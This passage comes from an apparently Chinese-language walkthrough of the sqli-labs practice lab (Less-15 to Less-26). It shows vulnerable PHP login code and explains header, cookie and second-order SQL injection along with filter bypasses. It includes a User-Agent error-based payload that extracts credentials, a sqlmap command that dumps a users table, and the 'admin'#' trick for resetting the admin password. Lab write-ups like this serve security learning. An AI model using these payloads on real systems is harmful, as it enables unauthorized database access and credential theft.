class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;uname&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class=\"subst\">$uname</span>&#x27; and password=&#x27;<span class=\"subst\">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"comment\">//&quot;查询结果&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"comment\">//print_r(mysql_error());</span></span><br></pre></td></tr></table></figure>\n\n<p>闭合方式改变，不能使用报错。</p>\n<h4 id=\"3-2-16-Less-16\"><a href=\"#3-2-16-Less-16\" class=\"headerlink\" title=\"3.2.16 Less-16\"></a>3.2.16 Less-16</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;uname&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT username, password FROM users WHERE username=(<span class=\"subst\">$uname</span>) and password=(<span class=\"subst\">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  \t<span class=\"comment\">//&quot;查询结果&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"comment\">//print_r(mysql_error());</span></span><br></pre></td></tr></table></figure>\n\n<p>闭合类型改变。</p>\n<h4 id=\"3-2-17-Less-17\"><a href=\"#3-2-17-Less-17\" class=\"headerlink\" title=\"3.2.17 Less-17\"></a>3.2.17 Less-17</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//过滤</span></span><br><span class=\"line\"><span class=\"variable\">$uname</span>=<span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;uname&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT username, password FROM users WHERE username= <span class=\"subst\">$uname</span> LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"variable\">$update</span>=<span class=\"string\">&quot;UPDATE users SET password = &#x27;<span class=\"subst\">$passwd</span>&#x27; WHERE username=&#x27;<span class=\"subst\">$row1</span>&#x27;&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> error</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></table></figure>\n\n<p><code>uname</code>被过滤了，只能考虑update这里注入，使用报错注入即可。</p>\n<h4 id=\"3-2-18-Less-18\"><a href=\"#3-2-18-Less-18\" class=\"headerlink\" title=\"3.2.18 Less-18\"></a>3.2.18 Less-18</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uagent</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$IP</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class=\"line\"><span class=\"comment\">//uname和passwd被过滤</span></span><br><span class=\"line\"><span class=\"variable\">$uname</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;uname&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$passwd</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class=\"subst\">$uname</span> and users.password=<span class=\"subst\">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"variable\">$insert</span>=<span class=\"string\">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class=\"subst\">$uagent</span>&#x27;, &#x27;<span class=\"subst\">$IP</span>&#x27;, <span class=\"subst\">$uname</span>)&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Your User Agent is: &#x27;</span> .<span class=\"variable\">$uagent</span>;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());\t</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></table></figure>\n\n<p>这里<code>uname</code>和<code>passwd</code>被过滤了，因此只能在insert语句注入。</p>\n<ul>\n<li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 客户端可以伪造。</li>\n<li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li>\n<li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li>\n</ul>\n<p>所以这里只能在<code>User-Agent</code>注入。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">User</span><span class=\"operator\">-</span>Agent: <span class=\"number\">1</span><span class=\"string\">&#x27;and (select 1 from (select count(*),concat((select concat(username,password) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and &#x27;</span><span class=\"number\">1</span><span class=\"string\">&#x27;=&#x27;</span><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/31899/image-20250310224830354.png\" class=\"\" title=\"image-20250310224830354\">\n\n<h4 id=\"3-2-19-Less-19\"><a href=\"#3-2-19-Less-19\" class=\"headerlink\" title=\"3.2.19 Less-19\"></a>3.2.19 Less-19</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$uagent</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$IP</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class=\"line\"><span class=\"comment\">//uname和passwd被过滤</span></span><br><span class=\"line\"><span class=\"variable\">$uname</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;uname&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$passwd</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class=\"subst\">$uname</span> and users.password=<span class=\"subst\">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"variable\">$insert</span>=<span class=\"string\">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class=\"subst\">$uagent</span>&#x27;, &#x27;<span class=\"subst\">$IP</span>&#x27;)&quot;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Your Referer is: &#x27;</span> .<span class=\"variable\">$uagent</span>;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());\t</span><br><span class=\"line\"><span class=\"keyword\">else</span> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></table></figure>\n\n<p><code>User-Agent</code>改为了<code>Referer</code>。</p>\n<h4 id=\"3-2-20-Less-20\"><a href=\"#3-2-20-Less-20\" class=\"headerlink\" title=\"3.2.20 Less-20\"></a>3.2.20 Less-20</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;uname&#x27;</span>]))</span><br><span class=\"line\">    <span class=\"comment\">//过滤uname和passwd</span></span><br><span class=\"line\">    <span class=\"variable\">$uname</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;uname&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$passwd</span> = <span class=\"title function_ invoke__\">check_input</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class=\"subst\">$uname</span> and users.password=<span class=\"subst\">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$cookee</span> = <span class=\"variable\">$row1</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">&#x27;uname&#x27;</span>, <span class=\"variable\">$cookee</span>, <span class=\"title function_ invoke__\">time</span>()+<span class=\"number\">3600</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))</span><br><span class=\"line\">        <span class=\"variable\">$cookee</span> = <span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;uname&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE username=&#x27;<span class=\"subst\">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"variable\">$result</span>)</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$row</span>)</span><br><span class=\"line\">            <span class=\"string\">&quot;输出查询的信息&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">&#x27;uname&#x27;</span>, <span class=\"variable\">$row1</span>[<span class=\"string\">&#x27;username&#x27;</span>], <span class=\"title function_ invoke__\">time</span>()-<span class=\"number\">3600</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>就是从<code>Cookie</code>中读取<code>uname</code>值，产生注入。</p>\n<h3 id=\"3-3-Less21-37\"><a href=\"#3-3-Less21-37\" class=\"headerlink\" title=\"3.3 Less21-37\"></a>3.3 Less21-37</h3><h4 id=\"3-3-1-Less-21\"><a href=\"#3-3-1-Less-21\" class=\"headerlink\" title=\"3.3.1 Less-21\"></a>3.3.1 Less-21</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$cookee</span> = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$cookee</span>);</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE username=(&#x27;<span class=\"subst\">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>只节选了相关代码，其余与<code>Less-20</code>大差不差，主要是多了一个base64编码，这里可以用sqlmap脚本。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u http://127.0.0.1:8888/Less-21/ --cookie=<span class=\"string\">&quot;uname=*&quot;</span> --tamper=<span class=\"string\">&quot;base64encode&quot;</span> -v 3 -D security -T <span class=\"built_in\">users</span> --dump --batch</span><br></pre></td></tr></table></figure>\n\n<img src=\"/posts/31899/image-20250310230842396.png\" class=\"\" title=\"image-20250310230842396\">\n\n<h4 id=\"3-3-2-Less-22\"><a href=\"#3-3-2-Less-22\" class=\"headerlink\" title=\"3.3.2 Less-22\"></a>3.3.2 Less-22</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$cookee1</span> = <span class=\"string\">&#x27;&quot;&#x27;</span>. <span class=\"variable\">$cookee</span>. <span class=\"string\">&#x27;&quot;&#x27;</span>;    </span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE username=<span class=\"subst\">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>闭合方式改变</p>\n<h4 id=\"3-3-3-Less-23\"><a href=\"#3-3-3-Less-23\" class=\"headerlink\" title=\"3.3.3 Less-23\"></a>3.3.3 Less-23</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$reg</span> = <span class=\"string\">&quot;/#/&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$reg1</span> = <span class=\"string\">&quot;/--/&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$replace</span> = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$reg</span>, <span class=\"variable\">$replace</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$reg1</span>, <span class=\"variable\">$replace</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"string\">&quot;查询结果&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></table></figure>\n\n<p>过滤了注释符，可以使用闭合方式。</p>\n<h4 id=\"3-3-4-Less-24\"><a href=\"#3-3-4-Less-24\" class=\"headerlink\" title=\"3.3.4 Less-24\"></a>3.3.4 Less-24</h4><p><code>login_create.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$username</span>=  <span class=\"title function_ invoke__\">mysql_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]) ;</span><br><span class=\"line\"><span class=\"variable\">$pass</span>= <span class=\"title function_ invoke__\">mysql_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$re_pass</span>= <span class=\"title function_ invoke__\">mysql_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;re_password&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select count(*) from users where username=&#x27;<span class=\"subst\">$username</span>&#x27;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$pass</span>==<span class=\"variable\">$re_pass</span>)</span><br><span class=\"line\">  <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into users ( username, password) values(\\&quot;<span class=\"subst\">$username</span>\\&quot;, \\&quot;<span class=\"subst\">$pass</span>\\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p><code>login.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$username</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;login_user&quot;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;login_password&quot;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT * FROM users WHERE username=&#x27;<span class=\"subst\">$username</span>&#x27; and password=&#x27;<span class=\"subst\">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p><code>pass_change.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$username</span>= <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&quot;username&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$curr_pass</span>= <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;current_password&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$pass</span>= <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$re_pass</span>= <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;re_password&#x27;</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$pass</span>==<span class=\"variable\">$re_pass</span>)</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;UPDATE users SET PASSWORD=&#x27;<span class=\"subst\">$pass</span>&#x27; where username=&#x27;<span class=\"subst\">$username</span>&#x27; and password=&#x27;<span class=\"subst\">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>这里大部分都被转义了，唯一可利用的地方在最后的<code>update</code>语句中的<code>username</code>，这里需要利用二次注入，即将构造的sql语句插入数据库中，在其被调用时触发。</p>\n<p>比如数据库有<code>username</code>值为<code>admin&#39;#</code>，被拼接进<code>update</code>语句就会变成：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> users <span class=\"keyword\">SET</span> PASSWORD<span class=\"operator\">=</span><span class=\"string\">&#x27;$pass&#x27;</span> <span class=\"keyword\">where</span> username<span class=\"operator\">=</span><span class=\"string\">&#x27;admin&#x27;</span>#<span class=\"string\">&#x27; and password=&#x27;</span>$curr_pass<span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>那么就直接修改了<code>admin</code>用户的密码。</p>\n<p>先注册一个名为<code>admin&#39;#</code>的用户</p>\n<img src=\"/posts/31899/image-20250310232549937.png\" class=\"\" title=\"image-20250310232549937\">\n\n<p>然后登录后修改密码</p>\n<img src=\"/posts/31899/image-20250310232652649.png\" class=\"\" title=\"image-20250310232652649\">\n\n<p>查看数据库发现<code>admin</code>用户密码被成功修改了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; <span class=\"keyword\">select</span> * from security.users;</span><br><span class=\"line\">+----+----------+------------+</span><br><span class=\"line\">| <span class=\"built_in\">id</span> | username | password   |</span><br><span class=\"line\">+----+----------+------------+</span><br><span class=\"line\">|  1 | Dumb     | Dumb       |</span><br><span class=\"line\">|  2 | Angelina | I-kill-you |</span><br><span class=\"line\">|  3 | Dummy    | p@ssword   |</span><br><span class=\"line\">|  4 | secure   | crappy     |</span><br><span class=\"line\">|  5 | stupid   | stupidity  |</span><br><span class=\"line\">|  6 | superman | genious    |</span><br><span class=\"line\">|  7 | batman   | mob!le     |</span><br><span class=\"line\">|  8 | admin    | 1234       |</span><br><span class=\"line\">|  9 | admin1   | admin1     |</span><br><span class=\"line\">| 10 | admin2   | admin2     |</span><br><span class=\"line\">| 11 | admin3   | admin3     |</span><br><span class=\"line\">| 12 | dhakkan  | dumbo      |</span><br><span class=\"line\">| 14 | admin4   | admin4     |</span><br><span class=\"line\">| 15 | admin<span class=\"string\">&#x27;#  | 123        |</span></span><br><span class=\"line\"><span class=\"string\">+----+----------+------------+</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-3-5-Less-25\"><a href=\"#3-3-5-Less-25\" class=\"headerlink\" title=\"3.3.5 Less-25\"></a>3.3.5 Less-25</h4><p>接下来很多是绕过过滤的，所以只考虑绕过过滤的部分。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM users WHERE id=&#x27;<span class=\"subst\">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/or/i&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);    </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/AND/i&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);</span><br></pre></td></tr></table></figure>\n\n<p>双写绕过<code>oorr</code>，符号替换<code>or</code>换成<code>||</code>。</p>\n<h4 id=\"3-3-6-Less-25a\"><a href=\"#3-3-6-Less-25a\" class=\"headerlink\" title=\"3.3.6 Less-25a\"></a>3.3.6 Less-25a</h4><p>无区别。</p>\n<h4 id=\"3-3-7-Less-26\"><a href=\"#3-3-7-Less-26\" class=\"headerlink\" title=\"3.3.7 Less-26\"></a>3.3.7 Less-26</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/or/i&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);           </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/and/i&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);     </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[\\/\\*]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);     </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[--]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);    </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;/[#]/&#x27;</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$id</span>);       </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ 